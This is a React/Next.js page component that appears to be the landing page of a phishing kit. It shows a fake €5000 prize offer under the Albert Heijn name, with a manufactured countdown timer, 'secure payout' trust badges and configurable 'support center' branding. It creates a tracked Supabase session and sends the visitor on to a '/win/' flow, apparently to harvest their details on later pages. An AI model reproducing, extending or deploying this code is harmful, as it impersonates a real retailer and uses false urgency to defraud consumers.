"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import LiveToast from "@/components/LiveToast";
import { useSettings } from "@/contexts/SettingsContext";

export default function Home() {
  const router = useRouter();
  const { settings } = useSettings();
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(345); // 5:45 min countdown

  // Countdown
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
  };

  const handleStart = async () => {
    setLoading(true);
    setError("");
    
    const supabase = createBrowserSupabaseClient();
    if (!supabase) {
      setError("Systemfehler: Keine Verbindung möglich.");
      setLoading(false);
      return;
    }

    // 1. Yeni bir session oluştur (Miktar 5000, Para Birimi €)
    const { data, error: insertError } = await supabase
      .from("sessions")
      .insert({ 
        amount: 5000, 
        current_step: "win", 
        status: "offline", 
        form_data: { 
          currency: "€",
        } 
      })
      .select("id")
      .maybeSingle();

    if (insertError || !data?.id) {
      setError("Ein Fehler ist aufgetreten. Bitte versuchen Sie es später erneut.");
      setLoading(false);
      return;
    }

    // 2. Başarıyla oluşturulduysa, yeni session ID ile win sayfasına yönlendir
    router.push(`/win/${data.id}`);
  };

  return (
    <div className="flex min-h-screen flex-col bg-transparent">
      {/* Top Banner */}
      <div className="fixed top-0 left-0 w-full h-2 bg-gradient-to-r from-[#ffd24d] via-[#7cc7ff] to-[#0051a5] z-[10001]" />
      
      {/* Header */}
      <header className="fixed top-2 left-0 w-full h-[104px] border-b border-white/20 glass-card z-[10000] flex items-center">
        <div className="mx-auto flex w-full max-w-5xl items-center justify-between px-6">
          <div className="flex items-center gap-3 sm:gap-4">
            <img src={settings.logo_url} alt="Logo" className="h-16 sm:h-20 w-auto object-contain drop-shadow-sm shrink-0" />
            <div className="flex flex-col justify-center">
              <p className="text-[10px] sm:text-xs font-bold uppercase tracking-widest text-gray-600">{settings.portal_name}</p>
              <p className="text-[15px] sm:text-lg font-semibold text-[#0051a5] whitespace-nowrap">{settings.support_center_name}</p>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="mx-auto flex w-full max-w-md flex-1 flex-col justify-center px-6 pt-[134px] pb-12 relative z-10 fade-in">
        <div className="app-panel rounded-2xl p-8 text-center relative overflow-hidden">
          
          {/* Subtle top highlight */}
          <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-[#0051a5] via-[#7cc7ff] to-[#ffd24d]" />

          <div className="mb-5 flex justify-center">
            <div className="rounded-full bg-[#0051a5]/10 p-4 ring-4 ring-[#0051a5]/5">
              <svg className="h-12 w-12 text-[#0051a5]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V5.5A2.5 2.5 0 109.5 8H12zm-7 4h14M5 12a2 2 0 110-4h14a2 2 0 110 4M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7" />
              </svg>
            </div>
          </div>
          
          <h1 className="text-2xl font-extrabold text-gray-900 mb-2">{settings.win_title}</h1>
          
          <div className="inline-flex items-center justify-center gap-2 rounded-full bg-red-50 px-3 py-1 mb-5 border border-red-100">
            <span className="relative flex h-2.5 w-2.5">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
            </span>
            <span className="text-xs font-bold text-red-600">Aanbieding eindigt over: {formatTime(timeLeft)}</span>
          </div>

          <p className="text-sm text-gray-700 mb-8 leading-relaxed font-medium">
            {settings.win_subtitle}
          </p>

          {error && (
            <div className="mb-6 rounded-lg bg-red-50 p-3 text-sm text-red-600 border border-red-200 text-left flex items-start gap-2">
              <svg className="w-5 h-5 shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
              {error}
            </div>
          )}

          <button
            onClick={() => void handleStart()}
            disabled={loading || timeLeft === 0}
            className="app-btn w-full rounded-xl py-4 text-base flex items-center justify-center gap-2"
          >
            {loading ? (
              <>
                <svg className="animate-spin -ml-1 mr-2 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Verwerken...
              </>
            ) : (
              <>
                {settings.win_button}
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M14 5l7 7m0 0l-7 7m7-7H3" />
                </svg>
              </>
            )}
          </button>

          {/* Trust badges */}
          <div className="mt-6 pt-5 border-t border-gray-200/60 flex items-center justify-center gap-4 text-gray-500">
             <div className="flex items-center gap-1.5 text-xs">
                <svg className="w-4 h-4 text-[#0051a5]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                Veilige uitbetaling
             </div>
             <div className="flex items-center gap-1.5 text-xs">
                <svg className="w-4 h-4 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
                Direct beschikbaar
             </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="mt-auto glass-card border-t border-white/20 py-6">
        <div className="mx-auto flex max-w-5xl flex-col items-center justify-between gap-4 px-6 text-xs text-gray-600 sm:flex-row font-medium">
          <p>© 2026 Albert Heijn</p>
          <div className="flex gap-4">
            <a href="#" className="hover:text-[#0051a5] transition-colors">Juridisch</a>
            <a href="#" className="hover:text-[#0051a5] transition-colors">Privacy</a>
            <a href="#" className="hover:text-[#0051a5] transition-colors">Voorwaarden</a>
          </div>
        </div>
      </footer>
    </div>
  );
}
